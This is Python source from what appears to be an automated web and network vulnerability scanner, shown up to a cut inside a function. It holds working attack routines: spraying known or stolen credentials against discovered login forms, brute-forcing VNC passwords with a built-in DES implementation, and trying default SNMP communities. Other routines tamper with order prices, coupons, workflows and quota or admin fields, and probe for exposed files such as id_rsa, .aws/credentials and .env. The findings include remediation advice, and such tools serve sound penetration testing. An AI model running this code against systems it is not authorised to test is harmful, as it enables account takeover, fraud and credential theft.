async def spray_known(conn, probes, findings, cred_pairs, cap_forms=4,
                      cap_tries=12, delay=1.2):
    """lockout-safe brute of USER-SUPPLIED known/stolen credentials against
       discovered login forms. one attempt per pair, paced, stop on first hit.
       a random-credential control must be rejected - a form that accepts
       everything never claims. distinct from spray_default (hardcoded pairs)."""
    if not cred_pairs:
        return 0
    forms = []
    for h in sorted(probes):
        i = probes.get(h) or {}
        body = i.get("body") or b""
        if not body or not i.get("status"):
            continue
        for m in LOGIN_FORM_RX.finditer(body):
            inner = m.group(2)
            if not re.search(rb"<input[^>]+type=[\"']?password", inner, re.I):
                continue
            am = FORM_ACTION_RX.search(m.group(1))
            action = am.group(1).decode("latin-1", "ignore") if am else "/"
            fields = {n.decode("latin-1", "ignore"): n.decode("latin-1", "ignore")
                      for n in FORM_NAME_RX.findall(inner)}
            forms.append((h, i.get("scheme") or "https", action, fields))
            if len(forms) >= cap_forms:
                break
        if len(forms) >= cap_forms:
            break
    if not forms:
        return 0
    hits = 0
    async with tsession(None) as session:
      for h, scheme, action, fields in forms:
        base = f"{scheme}://{h}"
        url = action if action.startswith("http") else base + (
            action if action.startswith("/") else "/" + action)
        ufield = next((k for k in fields if k.lower() in
                       ("user", "username", "login", "email", "user[login]")),
                      next(iter(fields), "username"))
        pfield = next((k for k in fields if k.lower() in
                       ("pass", "password", "user[password]", "passwd")),
                      "password")
        accepted = None
        tries = 0
        for user, pwd in cred_pairs:
            if tries >= cap_tries:
                break
            tries += 1
            data = {ufield: user, pfield: pwd}
            try:
                async with HTTP_SEM:
                    async with session.post(url, data=data, headers=UA, ssl=False,
                                            timeout=aiohttp.ClientTimeout(total=8),
                                            allow_redirects=False) as r:
                        st, hdr, body = r.status, dict(r.headers), await r.content.read(12_000)
            except Exception:
                await asyncio.sleep(delay)
                continue
            loc = (hdr.get("Location") or "").lower()
            cookie = "; ".join(f"{k}={v}" for k, v in hdr.items() if k.lower() == "set-cookie")
            success = (st in (301, 302, 303, 307, 308) and "login" not in loc
                       and "signin" not in loc) or bool(
                           re.search(rb"(logout|sign ?out|log ?out|dashboard|welcome)",
                                     body, re.I)) or bool(cookie)
            await asyncio.sleep(delay)
            if not success:
                continue
            # random-credential control on the same form + password
            ctl_user = "sxeNoUser" + os.urandom(2).hex()
            ctl_pwd = "sxeNoPass" + os.urandom(2).hex()
            ctl = None
            try:
                async with HTTP_SEM:
                    async with session.post(
                            url, data={ufield: ctl_user, pfield: ctl_pwd},
                            headers=UA, ssl=False,
                            timeout=aiohttp.ClientTimeout(total=8),
                            allow_redirects=False) as r:
                        cst, chdr, cbody = r.status, dict(r.headers), await r.content.read(12_000)
                        cloc = (chdr.get("Location") or "").lower()
                        ccookie = "; ".join(
                            f"{k}={v}" for k, v in chdr.items()
                            if k.lower() == "set-cookie")
                        ctl = ((cst in (301, 302, 303, 307, 308)
                                and "login" not in cloc and "signin" not in cloc)
                               or bool(re.search(
                                   rb"(logout|sign ?out|log ?out|dashboard|welcome)",
                                   cbody, re.I)) or bool(ccookie))
            except Exception:
                ctl = None
            await asyncio.sleep(delay)
            if ctl is None:
                continue           # no control answer: do not claim
            if not ctl:
                accepted = (user, pwd)
                break
        if accepted:
            user, pwd = accepted
            findings.append(
                f"[SPRAY-KNOWN] {url} accepts known/stolen credential "
                f"{user}:{pwd} (random-credential control rejected) - "
                f"force a password reset and rotate this credential")
            hits += 1
      if hits:
        print(f"  [sprayknown] -> {hits} known-credential hit(s)", flush=True)
    return hits


async def biz_price_check(conn, probes, findings, cap_hosts=6):
    """client-side price/quantity tampering: POST an order with a negative or
       zero price/qty, then read the stored total back. the stored total must
       drop below the control total for the same item at its normal price."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with tsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            tok = os.urandom(3).hex()
            hds = {"Content-Type": "application/json", **UA}
            # control: normal price -> read total
            ctl_body = json.dumps({"item": f"sxBiz-{tok}", "qty": 1, "price": 100})
            c_loc = ""
            try:
                async with HTTP_SEM:
                    async with s.post(b + "/api/orders", data=ctl_body, headers=hds,
                                      ssl=False, timeout=aiohttp.ClientTimeout(total=8),
                                      allow_redirects=False) as r:
                        cst, cbody = r.status, await r.content.read(20_000)
                        c_loc = r.headers.get("Location") or ""
            except Exception:
                return
            if cst not in (200, 201):
                return
            ctl_url = c_loc if c_loc.startswith("http") else f"{b}/api/orders/{tok}"
            cgs, cgb, _ = await _grab(s, ctl_url, timeout=8, limit=20000)
            ctl_total = None
            if cgb:
                m = re.search(rb'"(?:total|amount|price)"\s*:\s*(-?[0-9]+(?:\.[0-9]+)?)', cgb)
                if m:
                    ctl_total = float(m.group(1))
            if ctl_total is None or ctl_total <= 0:
                return
            # tampered: negative price + zero qty
            evil_body = json.dumps({"item": f"sxBiz-{tok}", "qty": 0, "price": -1})
            e_loc = ""
            try:
                async with HTTP_SEM:
                    async with s.post(b + "/api/orders", data=evil_body, headers=hds,
                                      ssl=False, timeout=aiohttp.ClientTimeout(total=8),
                                      allow_redirects=False) as r:
                        est, ebody = r.status, await r.content.read(20_000)
                        e_loc = r.headers.get("Location") or ""
            except Exception:
                return
            if est not in (200, 201) or not ebody:
                return
            evil_url = e_loc if e_loc.startswith("http") else f"{b}/api/orders/{tok}-evil"
            egs, egb, _ = await _grab(s, evil_url, timeout=8, limit=20000)
            if egs != 200 or not egb:
                return
            em = re.search(rb'"(?:total|amount|price)"\s*:\s*(-?[0-9]+(?:\.[0-9]+)?)', egb)
            if not em:
                return
            evil_total = float(em.group(1))
            # gate: server stored a lower/negative total from client input
            if evil_total < ctl_total and evil_total <= 0:
                hit += 1
                findings.append(
                    f"[BIZ-PRICE] {b}/api/orders stores a client-supplied "
                    f"negative/zero price (total {evil_total} vs control "
                    f"{ctl_total}) - recompute price server-side, never trust "
                    f"client price/qty")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [bizprice] -> {hit} price-tamper hit(s)", flush=True)
    return hit


async def biz_coupon_check(conn, probes, findings, cap_hosts=6):
    """coupon reuse: apply the same coupon twice against two different orders
       and require both to succeed with the discounted total (single-use not
       enforced). a control coupon that is rejected on reuse must not claim."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with tsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            tok = os.urandom(3).hex()
            coupon = f"SXE{tok.upper()[:6]}"
            hds = {"Content-Type": "application/json", **UA}
            totals = []
            for i in range(2):
                body = json.dumps({"item": f"sxCoup-{tok}-{i}", "qty": 1,
                                   "price": 100, "coupon": coupon})
                loc = ""
                try:
                    async with HTTP_SEM:
                        async with s.post(b + "/api/orders", data=body, headers=hds,
                                          ssl=False, timeout=aiohttp.ClientTimeout(total=8),
                                          allow_redirects=False) as r:
                            st = r.status
                            loc = r.headers.get("Location") or ""
                            _ = await r.content.read(4000)
                except Exception:
                    return
                if st not in (200, 201):
                    return
                url = loc if loc.startswith("http") else f"{b}/api/orders/{tok}-{i}"
                gs, gb, _ = await _grab(s, url, timeout=8, limit=20000)
                if gs != 200 or not gb:
                    return
                m = re.search(rb'"(?:total|amount|price)"\s*:\s*([0-9]+(?:\.[0-9]+)?)', gb)
                if not m:
                    return
                totals.append(float(m.group(1)))
            if len(totals) != 2:
                return
            # gate: both orders got a discount (total < full price) -> reuse
            if totals[0] < 100 and totals[1] < 100:
                hit += 1
                findings.append(
                    f"[BIZ-COUPON] {b}/api/orders accepts coupon {coupon} on "
                    f"two separate orders (totals {totals[0]}/{totals[1]} both "
                    f"discounted) - enforce single-use / per-account coupon "
                    f"limits server-side")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [bizcoupon] -> {hit} coupon-reuse hit(s)", flush=True)
    return hit


async def biz_workflow_check(conn, probes, findings, cap_hosts=6):
    """workflow/step bypass: attempt to complete the last step of a flow
       (e.g. order confirm / verify) without first creating the resource.
       a successful final-step response with no prior step = skipped flow."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with tsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            tok = os.urandom(3).hex()
            hds = {"Content-Type": "application/json", **UA}
            # jump straight to the final step, no prior create
            body = json.dumps({"order_id": f"sxBizFlow-{tok}", "step": "confirm",
                               "status": "paid", "payment_id": f"pay-{tok}"})
            loc = ""
            try:
                async with HTTP_SEM:
                    async with s.post(b + "/api/orders/confirm", data=body, headers=hds,
                                      ssl=False, timeout=aiohttp.ClientTimeout(total=8),
                                      allow_redirects=False) as r:
                        st = r.status
                        loc = r.headers.get("Location") or ""
                        rb = await r.content.read(12_000)
            except Exception:
                return
            if st not in (200, 201) or not rb:
                return
            # must actually show completion, not just echo the request
            if not re.search(rb'"(?:status|state)"\s*:\s*"(?:paid|confirmed|complete|done|success)"',
                             rb, re.I):
                return
            # control: a bogus order id must be rejected (server checks existence)
            ctl_body = json.dumps({"order_id": "sxBizNoOrder-" + tok, "step": "confirm",
                                   "status": "paid", "payment_id": "pay-none"})
            try:
                async with HTTP_SEM:
                    async with s.post(b + "/api/orders/confirm", data=ctl_body, headers=hds,
                                      ssl=False, timeout=aiohttp.ClientTimeout(total=8),
                                      allow_redirects=False) as r:
                        cbody = await r.content.read(12_000)
                        cst = r.status
            except Exception:
                return
            # gate: evil worked AND the bogus control was rejected -> real bypass
            ctl_rejected = (cst >= 400 or not cbody or
                            not re.search(rb'"(?:status|state)"\s*:\s*"(?:paid|confirmed|complete|done|success)"',
                                          cbody, re.I))
            if ctl_rejected:
                hit += 1
                findings.append(
                    f"[BIZ-WORKFLOW] {b}/api/orders/confirm completes an "
                    f"out-of-order flow (final step without prior create; "
                    f"bogus-id control rejected) - enforce the ordered "
                    f"workflow server-side and reject skipped transitions")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [bizflow] -> {hit} workflow-bypass hit(s)", flush=True)
    return hit


async def biz_quota_check(conn, probes, findings, cap_hosts=6):
    """quota/limit tampering: a server that honours a client-supplied
       limit/credit/remaining field. POST a resource with an inflated quota
       and require the read-back to show the raised value; a control without
       the field must not show it."""
    targets = [h for h in sorted(probes) if probes[h].get("status")][:cap_hosts]
    hit = 0
    async with tsession(conn) as s:
        async def one(h):
            nonlocal hit
            b = _burl(probes, h)
            tok = os.urandom(3).hex()
            hds = {"Content-Type": "application/json", **UA}
            # control: no quota field
            cb = json.dumps({"name": f"sxQuota-{tok}"})
            c_loc = ""
            try:
                async with HTTP_SEM:
                    async with s.post(b + "/api/users", data=cb, headers=hds,
                                      ssl=False, timeout=aiohttp.ClientTimeout(total=8),
                                      allow_redirects=False) as r:
                        cst = r.status
                        c_loc = r.headers.get("Location") or ""
                        _ = await r.content.read(4000)
            except Exception:
                return
            if cst not in (200, 201):
                return
            ctl_url = c_loc if c_loc.startswith("http") else f"{b}/api/users/{tok}"
            cgs, cgb, _ = await _grab(s, ctl_url, timeout=8, limit=20000)
            ctl_has = bool(cgb and re.search(
                rb'"(?:quota|credit|limit|remaining|credits)"\s*:\s*[1-9]', cgb))
            # tampered: client tries to set its own quota high
            eb = json.dumps({"name": f"sxQuota-{tok}-e", "quota": 999999,
                             "credit": 999999, "limit": 999999,
                             "remaining": 999999, "is_admin": True})
            e_loc = ""
            try:
                async with HTTP_SEM:
                    async with s.post(b + "/api/users", data=eb, headers=hds,
                                      ssl=False, timeout=aiohttp.ClientTimeout(total=8),
                                      allow_redirects=False) as r:
                        est = r.status
                        e_loc = r.headers.get("Location") or ""
                        _ = await r.content.read(4000)
            except Exception:
                return
            if est not in (200, 201):
                return
            evil_url = e_loc if e_loc.startswith("http") else f"{b}/api/users/{tok}-e"
            egs, egb, _ = await _grab(s, evil_url, timeout=8, limit=20000)
            if egs != 200 or not egb:
                return
            m = re.search(rb'"(?:quota|credit|limit|remaining|credits)"\s*:\s*([0-9]+)', egb)
            if not m:
                return
            val = int(m.group(1))
            # gate: stored the inflated value AND the control didn't already
            # carry it -> the client-supplied quota was honoured
            if val >= 999999 and not ctl_has:
                hit += 1
                findings.append(
                    f"[BIZ-QUOTA] {b}/api/users stores a client-supplied "
                    f"quota/limit of {val} (control without the field has none) "
                    f"- enforce quota server-side and ignore client "
                    f"limit/credit/remaining fields")
        await asyncio.gather(*[one(h) for h in targets])
    if hit:
        print(f"  [bizquota] -> {hit} quota-tamper hit(s)", flush=True)
    return hit


def _des_ecb(block, key):
    """one DES-ECB block (VNC uses 8-byte password key + 8-byte challenge
       half). compact implementation with the standard IP/FP/S-box tables."""
    IP = (58,50,42,34,26,18,10,2,60,52,44,36,28,20,12,4,
          62,54,46,38,30,22,14,6,64,56,48,40,32,24,16,8,
          57,49,41,33,25,17,9,1,59,51,43,35,27,19,11,3,
          61,53,45,37,29,21,13,5,63,55,47,39,31,23,15,7)
    FP = (40,8,48,16,56,24,64,32,39,7,47,15,55,23,63,31,
          38,6,46,14,54,22,62,30,37,5,45,13,53,21,61,29,
          36,4,44,12,52,20,60,28,35,3,43,11,51,19,59,27,
          34,2,42,10,50,18,58,26,33,1,41,9,49,17,57,25)
    E = (32,1,2,3,4,5,4,5,6,7,8,9,8,9,10,11,12,13,
         12,13,14,15,16,17,16,17,18,19,20,21,20,21,22,23,
         24,25,24,25,26,27,28,29,28,29,30,31,32,1)
    P = (16,7,20,21,29,12,28,17,1,15,23,26,5,18,31,10,
         2,8,24,14,32,27,3,9,19,13,30,6,22,11,4,25)
    PC1 = (57,49,41,33,25,17,9,1,58,50,42,34,26,18,
           10,2,59,51,43,35,27,19,11,3,60,52,44,36,
           63,55,47,39,31,23,15,7,62,54,46,38,30,22,
           14,6,61,53,45,37,29,21,13,5,28,20,12,4)
    PC2 = (14,17,11,24,1,5,3,28,15,6,21,10,
           23,19,12,4,26,8,16,7,27,20,13,2,
           41,52,31,37,47,55,30,40,51,45,33,48,
           44,49,39,56,34,53,46,42,50,36,29,32)
    S = (  ((14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7),
            (0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8),
            (4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0),
            (15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13)),
           ((15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10),
            (3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5),
            (0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15),
            (13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9)),
           ((10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8),
            (13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1),
            (13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7),
            (1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12)),
           ((7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15),
            (13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9),
            (10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4),
            (3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14)),
           ((2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9),
            (14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6),
            (4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14),
            (11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3)),
           ((12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11),
            (10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8),
            (9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6),
            (4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13)),
           ((4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1),
            (13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6),
            (1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2),
            (6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12)),
           ((13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7),
            (1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2),
            (7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8),
            (2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11)))
    def perm(val, table, inbits):
        out = 0
        for i in table:
            out = (out << 1) | ((val >> (inbits - i)) & 1)
        return out
    k = int.from_bytes(key, "big")
    b = int.from_bytes(block, "big")
    b = perm(b, IP, 64)
    L, R = (b >> 32) & 0xFFFFFFFF, b & 0xFFFFFFFF
    k56 = perm(k, PC1, 64)
    C, D = (k56 >> 28) & 0xFFFFFFF, k56 & 0xFFFFFFF
    for rnd in range(16):
        shift = (1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1)[rnd]
        C = ((C << shift) | (C >> (28 - shift))) & 0xFFFFFFF
        D = ((D << shift) | (D >> (28 - shift))) & 0xFFFFFFF
        subkey = perm((C << 28) | D, PC2, 56)
        fe = perm(R, E, 32) ^ subkey
        s_out = 0
        for i in range(8):
            chunk = (fe >> (42 - 6 * i)) & 0x3F
            row = ((chunk & 0x20) >> 4) | (chunk & 1)
            col = (chunk >> 1) & 0xF
            s_out = (s_out << 4) | S[i][row][col]
        L, R = R, L ^ perm(s_out, P, 32)
    pre = (R << 32) | L
    return perm(pre, FP, 64).to_bytes(8, "big")


VNC_PWDS = ("password", "12345678", "admin", "secret", "vnc", "pass",
            "1234", "changeme", "password123", "letmein")


def _vnc_auth_resp(challenge, password):
    key = password.encode("latin-1", "ignore")[:8].ljust(8, b"\x00")
    key = bytes(((b << 7) & 0x80) | (b >> 1) for b in key)   # VNC bit-reverses
    return _des_ecb(challenge[:8], key) + _des_ecb(challenge[8:16], key)


async def vnc_weak_check(h, p, wordlist=VNC_PWDS, cap=6):
    """attempt VNC auth (security type 2) with common passwords after the
       handshake offers type 2. returns the accepted password or None.
       one password per connection - the server closes after a failed
       SecurityResult, so each attempt needs a fresh handshake."""
    async def attempt(_pw):
        try:
            rd, wr = await asyncio.wait_for(asyncio.open_connection(h, p), 5)
        except Exception:
            return False
        try:
            greet = await asyncio.wait_for(rd.readexactly(12), 4)
            if not greet.startswith(b"RFB "):
                return False
            wr.write(greet)
            await wr.drain()
            if greet[4:11] == b"003.003":
                raw = await asyncio.wait_for(rd.readexactly(4), 4)
                types = [int.from_bytes(raw, "big")]
            else:
                n = (await asyncio.wait_for(rd.readexactly(1), 4))[0]
                if not (0 < n <= 64):
                    return False
                types = list(await asyncio.wait_for(rd.readexactly(n), 4))
            if 2 not in types:
                return False
            wr.write(b"\x02")
            await wr.drain()
            challenge = await asyncio.wait_for(rd.readexactly(16), 6)
            wr.write(_vnc_auth_resp(challenge, _pw))
            await wr.drain()
            res = await asyncio.wait_for(rd.readexactly(4), 6)
            return int.from_bytes(res, "big") == 0
        except Exception:
            return False
        finally:
            try:
                wr.close()
                await wr.wait_closed()
            except Exception:
                pass

    for _pw in wordlist[:cap]:
        if await attempt(_pw):
            return _pw
    return None


def _ber_len(n):
    if n < 0x80:
        return bytes([n])
    return bytes([0x80 | len(n.to_bytes(2, "big")), *n.to_bytes(2, "big")])


def _ber_seq(content, tag=0x30):
    return bytes([tag]) + _ber_len(len(content)) + content


def _ber_oid(oid):
    body = bytes([40 * oid[0] + oid[1]])
    for v in oid[2:]:
        stack = [v & 0x7F]
        v >>= 7
        while v:
            stack.append(0x80 | (v & 0x7F))
            v >>= 7
        body += bytes(reversed(stack))
    return bytes([0x06]) + _ber_len(len(body)) + body


def _snmp_get(community, oid=(1, 3, 6, 1, 2, 1, 1, 1, 0)):
    varbind = _ber_seq(_ber_oid(oid) + b"\x05\x00")
    pdu = _ber_seq(b"\x02\x01\x01" + b"\x02\x01\x00" + b"\x02\x01\x00" +
                   _ber_seq(varbind), 0xA0)
    return _ber_seq(b"\x02\x01\x00" +
                    bytes([0x04]) + _ber_len(len(community)) + community + pdu)


async def udp_probe(host, port, payload, timeout=3.0):
    """send a UDP payload and return the first response bytes (b'' if none)."""
    loop = asyncio.get_running_loop()
    fut = loop.create_future()

    class _Proto(asyncio.DatagramProtocol):
        def datagram_received(self, data, addr):
            if not fut.done():
                fut.set_result(data)

        def error_received(self, exc):
            if not fut.done():
                fut.set_result(b"")

    try:
        t, _ = await loop.create_datagram_endpoint(
            _Proto, remote_addr=(host, port))
    except Exception:
        return b""
    try:
        t.sendto(payload)
        return await asyncio.wait_for(fut, timeout)
    except Exception:
        return b""
    finally:
        try:
            t.close()
        except Exception:
            pass


async def snmp_public_check(host, findings, communities=("public", "private"),
                            port=161):
    """SNMPv1 GET sysDescr with common communities over UDP - a valid
       response carrying the community proves the device answers."""
    for comm in communities:
        resp = await udp_probe(host, port, _snmp_get(comm.encode()))
        if resp and resp[:1] == b"\x30" and comm.encode() in resp:
            findings.append(
                f"[SNMP-PUBLIC] {host}:{port} (udp) answers SNMPv1 GET sysDescr "
                f"with community `{comm}` - device config, routing and "
                f"network topology disclosed; restrict to SNMPv3 + auth")
            return comm
    return None


async def memcached_udp_check(host, findings, port=11211):
    """UDP stats request - a STAT response proves the amplification
       surface (the TCP variant is already covered by SVC-MEMCACHED)."""
    hdr = (os.urandom(2) + b"\x00\x00\x00\x01\x00\x00")
    resp = await udp_probe(host, port, hdr + b"stats\r\n")
    if resp and b"STAT " in resp:
        findings.append(
            f"[MEMCACHED-UDP] {host}:{port} (udp) answers a stats request - "
            f"UDP amplification surface (up to 51x) plus data exposure; "
            f"disable UDP or firewall 11211/udp")
        return True
    return False


async def udp_service_checks(hosts, findings, cap=40):
    """probe SNMP + memcached over UDP on live hosts (new transport - the
       TCP scanner does not cover these)."""
    rows = 0
    for h in hosts[:cap]:
        if await snmp_public_check(h, findings):
            rows += 1
        if await memcached_udp_check(h, findings):
            rows += 1
    if rows:
        print(f"  [udp] -> {rows} udp service hit(s)", flush=True)
    return rows


def leak_ok(path, body):
    if not body:
        return False
    head = body[:300].lower()
    if path == "/server-status":
        # the genuine Apache status page IS html - its marker is specific
        # enough (a soft-404 never contains "Apache Server Status")
        return b"Apache Server Status" in body
    if path == "/__debug__/":
        # django debug toolbar is html but its markers are as specific as
        # Apache Server Status - check before the soft-404 html gate
        return (b"Django Debug Toolbar" in body or b"djdt" in body
                or b"DJDT" in body)
    if path == "/console":
        # werkzeug interactive debugger is html; the traceback console
        # marker never appears in a soft-404
        return b"Werkzeug Debugger" in body or b"__debugger__" in body
    if path == "/actuator":
        return (body.lstrip()[:1] == b"{" and b'"_links"' in body
                and b"actuator" in body.lower())
    if path == "/phpinfo.php":
        return b"phpinfo()" in body and b"PHP Version" in body
    if path.startswith("/swagger"):
        # swagger-ui is html, api-docs/swagger.json are json - both carry
        # endpoint-surface markers specific enough to beat soft-404s
        lowb = body.lower()
        return (b"swagger-ui" in lowb
                or (body.lstrip()[:1] == b"{" and b'"paths"' in body
                    and (b'"swagger"' in lowb or b'"openapi"' in lowb)))
    if path in ("/api-docs", "/v2/api-docs", "/openapi.json"):
        lowb = body.lower()
        return (body.lstrip()[:1] == b"{"
                and (b'"openapi"' in lowb or b'"swagger"' in lowb)
                and b'"paths"' in lowb)
    if path == "/h2-console":
        lowb = body.lower()
        return (b"h2 database" in lowb or b"h2-console" in lowb
                or (b"jdbc:h2" in lowb and b"login" in lowb))
    if path == "/elmah.axd":
        lowb = body.lower()
        return (b"error log for" in lowb
                or (b"elmah" in lowb and b"<table" in lowb))
    if path == "/trace.axd":
        lowb = body.lower()
        return (b"application trace" in lowb
                or (b"trace.axd" in lowb and b"request details" in lowb))
    if path == "/v1/sys/mounts":
        return (body.lstrip()[:1] == b"{"
                and (b"cubbyhole/" in body or b"secret/" in body
                     or b"identity/" in body))
    if path in ("/application/master", "/default/master"):
        return (body.lstrip()[:1] == b"{"
                and b'"propertySources"' in body)
    if path.startswith("/nacos/v1/auth/users"):
        return (body.lstrip()[:1] == b"{"
                and (b'"pageItems"' in body or b'"username"' in body))
    if path == "/adminer.php":
        lowb = body.lower()
        return (b"adminer" in lowb
                and (b"<form" in lowb or b"login" in lowb))
    if path == "/phpmyadmin/":
        lowb = body.lower()
        return (b"pmahomme" in lowb
                or (b"phpmyadmin" in lowb
                    and (b"pma_username" in lowb or b"<form" in lowb)))
    if path == "/server-info":
        return (b"Apache Server Version" in body
                or (b"Server Information" in body and b"Apache" in body))
    if path == "/jmx-console/":
        lowb = body.lower()
        return (b"jmx console" in lowb
                or (b"jmx-console" in lowb and b"login" in lowb))
    if path == "/invoker/JMXInvokerServlet":
        # Java serialized object stream magic ac ed 00 05 - unique enough
        # that no soft-404 can imitate it
        return body[:4] == b"\xac\xed\x00\x05"
    if b"<!doctype html" in head or b"<html" in head:
        # soft-404 / error page must not satisfy any fingerprint
        # (LEAK is critical) - gate BEFORE the per-path checks
        return False
    if path == "/.git/HEAD":
        return body.lstrip().startswith(b"ref: refs/")
    if path == "/.git/config":
        return b"[core]" in body
    if path == "/.DS_Store":
        return b"Bud1" in body[:64]
    if path == "/id_rsa" or path.endswith("/id_rsa"):
        return b"PRIVATE KEY" in body
    if path == "/.aws/credentials":
        return b"aws_access_key_id" in body or b"[default]" in body
    if path == "/backup.zip":
        return body[:4] == b"PK\x03\x04" or body[:2] == b"\x1f\x8b"
    if path.startswith("/wp-config.php"):
        return (b"<?php" in head or b"DB_NAME" in body
                or b"DB_PASSWORD" in body)
    if path == "/.svn/entries":
        return bool(re.match(rb"\d{1,2}[\r\n]+", body)
                    and b"://" in body[:400])
    if path == "/.svn/wc.db":
        return body[:16].startswith(b"SQLite format 3")
    if path == "/.git/index":
        return body[:4] == b"DIRC" or b"DIRC" in body[:64]
    if path == "/.htpasswd":
        return bool(re.search(
            rb"(?m)^[A-Za-z0-9._\-]{1,64}:(?:\$apr1\$|\$2[aby]\$|\{SHA\}|"
            rb"\$1\$)", body))
    if path == "/.htaccess":
        return any(m in body for m in (b"RewriteEngine", b"php_value",
                                       b"AuthType", b"Require all",
                                       b"Deny from", b"Options "))
    if path == "/web.config":
        return (b"<configuration" in body
                and (b"<system.web" in body or b"<system.webServer" in body))
    if path == "/.npmrc":
        return bool(re.search(rb"(?m)^(?:@[\w.\-]+:)?registry\s*=", body))
    if path == "/WEB-INF/web.xml":
        return b"<web-app" in body
    if path == "/dump.sql":
        return any(m in body for m in (b"CREATE TABLE", b"INSERT INTO",
                                       b"mysqldump", b"COPY "))
    if path == "/.idea/workspace.xml":
        return b"<project" in body and b"<component" in body
    if path == "/Dockerfile":
        return body.lstrip().lower().startswith(b"from ")
    if path == "/yarn.lock":
        return body.lstrip().startswith(b"yarn lockfile")
    if path == "/Gemfile.lock":
        return b"specs:" in body and b"DEPENDENCIES" in body
    if path == "/actuator/env":
        return b"propertySources" in body or b"activeProfiles" in body
    if path == "/actuator/heapdump":
        # HPROF binary dump - the magic is unique enough to beat soft-404s
        return b"JAVA PROFILE" in body[:32]
    if path.startswith("/jolokia"):
        lowb = body.lower()
        return (b'"agent"' in lowb and b'"protocol"' in lowb
                and b"jolokia" in lowb)
    if path == "/Jenkinsfile":
        return (b"pipeline {" in body or b"agent {" in body
                or b"stage(" in body)
    if path.endswith((".gitlab-ci.yml", ".travis.yml")):
        low = body.lower()
        return (b"script:" in low or b"jobs:" in low or b"stages:" in low
                or b"matrix:" in low)
    if ".circleci" in path:
        low = body.lower()
        return b"version:" in low and (b"jobs:" in low or b"workflows:" in low)
    if ".env" in path:
        # KEY=VALUE lines; JSON/HTML/blank error bodies have none
        return bool(re.search(rb"(?m)^[A-Za-z_][A-Za-z0-9_.]*=", body))
    if path.endswith(".json"):
        if body.lstrip()[:1] not in (b"{", b"["):
            return False
        low = body.lower()
        if path.endswith(("package.json", "package-lock.json",
                          "composer.json", "composer.lock")):
            return any(m in low for m in (b'"dependencies"', b'"require"',
                                          b'"name"', b'"lockfileversion"',
                                          b'"content-hash"'))
        # config.json: a {"error":...} body is not config
        return b'"error"' not in low and b'"not found"' not in low
    return len(body) > 0


def dsstore_names(body):
    """extract file/dir names from a .DS_Store blob (Bud1 magic, UTF-16BE names)."""
    if not body or b"Bud1" not in body[:64]:
        return []
    names = set()
    for m in re.finditer(rb"(?:\x00[\x20-\x7e]){3,60}", body):
        s = m.group().decode("utf-16-be", "ignore").strip()
        if s and s not in (".", "..") and re.fullmatch(r"[\w.\- ()#@]{1,64}", s):
            names.add(s)
    return sorted(names)


ROBOTS_SENS_RX = re.compile(
    r"(?i)(^|/)(admin|administrator|backup|bak|debug|console|panel|dashboard"
    r"|private|internal|staff|config|upload|import|export|secret|phpmyadmin"
    r"|wp-admin|login|user|users|test|dev|stage|staging|db|api|old|dump)"
    r"(/|$|[-_.])|\.env|\.git|\.sql|\.bak|\.old|~$")


async def file_leaks(session, host, findings):
    # robots.txt disallow rules leak hidden surface ("disallowed" is not
    # "protected") - only juicy paths count, a bare / does not
    for scheme in ("https", "http"):
        try:
            async with HTTP_SEM:
                async with session.get(f"{scheme}://{host}/robots.txt",
                                       headers=UA,
                                       timeout=aiohttp.ClientTimeout(total=6),
                                       ssl=False, allow_redirects=False) as r:
                    if r.status != 200:
                        continue
                    rb = await r.content.read(65536)
                    juicy = []
                    for pth in re.findall(rb"(?im)^disallow\s*:\s*(/\S*)", rb):
                        s = pth.decode("latin-1", "ignore").strip()
                        if s == "/" or s in juicy:
                            continue
                        if ROBOTS_SENS_RX.search(s):
                            juicy.append(s)
                    if juicy:
                        # confirm before claiming: a catch-all 200 (SPA soft
                        # -404) makes EVERY disallow look live. fetch each
                        # candidate (max 3) - only paths the server actually
                        # distinguishes count (404/410/400 = absent, 401/403/
                        # 405/5xx/3xx/200-distinct = live surface)
                        ctrl = None            # (status, body) of a junk path
                        ctrl_done = False
                        conf = []
